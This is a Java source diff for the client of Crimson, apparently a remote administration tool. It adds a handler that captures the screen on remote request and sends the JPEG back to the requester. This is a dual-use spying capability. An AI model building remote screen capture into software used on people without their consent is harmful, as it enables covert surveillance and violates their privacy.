@@ -17,15 +17,21 @@
  *****************************************************************************/
 package com.subterranean_security.crimson.client.net;
 
+import java.awt.image.BufferedImage;
+import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.IOException;
 import java.util.concurrent.TimeUnit;
 
+import javax.imageio.ImageIO;
+
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
+import com.google.protobuf.ByteString;
 import com.subterranean_security.crimson.client.Client;
 import com.subterranean_security.crimson.client.ClientStore;
+import com.subterranean_security.crimson.client.modules.QuickScreenshot;
 import com.subterranean_security.crimson.client.stream.CInfoSlave;
 import com.subterranean_security.crimson.core.Common;
 import com.subterranean_security.crimson.core.Platform;
@@ -41,6 +47,7 @@ import com.subterranean_security.crimson.core.proto.FileManager.RS_FileHandle;
 import com.subterranean_security.crimson.core.proto.FileManager.RS_FileListing;
 import com.subterranean_security.crimson.core.proto.MSG.Message;
 import com.subterranean_security.crimson.core.proto.Misc.Group;
+import com.subterranean_security.crimson.core.proto.Screenshot.RS_QuickScreenshot;
 import com.subterranean_security.crimson.core.proto.Stream.Param;
 import com.subterranean_security.crimson.core.proto.Update.RS_GetClientConfig;
 import com.subterranean_security.crimson.core.stream.StreamStore;
@@ -106,6 +113,8 @@ public class ClientExecutor extends BasicExecutor {
 						rq_get_client_config(m);
 					} else if (m.hasRsGenerate()) {
 						rs_generate(m);
+					} else if (m.hasRqQuickScreenshot()) {
+						rq_quick_screenshot(m);
 					} else {
 						connector.cq.put(m.getId(), m);
 					}
@@ -290,6 +299,25 @@ public class ClientExecutor extends BasicExecutor {
 					((Platform.osFamily == OSFAMILY.WIN && !Common.isDebugMode()) ? "javaw" : "java") + " -jar \""
 							+ temp.getAbsolutePath() + "/installer.jar\" update");
 			System.exit(0);
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+	}
+
+	private void rq_quick_screenshot(Message m) {
+		ByteArrayOutputStream baos = new ByteArrayOutputStream();
+		try {
+			ImageIO.write(QuickScreenshot.snap(), "jpg", baos);
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+			return;
+		}
+		ClientStore.Connections.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(Common.cvid)
+				.setRsQuickScreenshot(RS_QuickScreenshot.newBuilder().setBin(ByteString.copyFrom(baos.toByteArray()))));
+		try {
+			baos.close();
 		} catch (IOException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
